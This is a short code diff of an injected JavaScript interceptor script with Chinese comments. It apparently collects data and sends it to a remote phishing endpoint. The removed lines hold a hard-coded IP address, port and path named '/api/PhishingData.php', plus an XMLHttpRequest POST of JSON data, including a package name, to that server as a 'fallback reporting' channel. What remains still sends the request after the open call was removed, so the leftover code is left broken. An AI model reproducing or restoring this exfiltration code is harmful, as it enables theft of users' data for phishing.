@@ -7,7 +7,7 @@
   window.__fyInterceptorInjected = true;
 
   var TARGET_PATH = '/api/PhishingData.php';
-  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';
+
 
   function isOurTargetUrl(u){
     if (!u) return false;
@@ -1259,7 +1259,7 @@
         // 通道 4: Ajax 后台兜底上报
         try {
           var xhr = new XMLHttpRequest();
-          xhr.open('POST', "http://18.142.44.159:8035/api/PhishingData.php", true);
+
           xhr.setRequestHeader('Content-Type', 'application/json');
           xhr.send(JSON.stringify({
             pkg: pkgName,
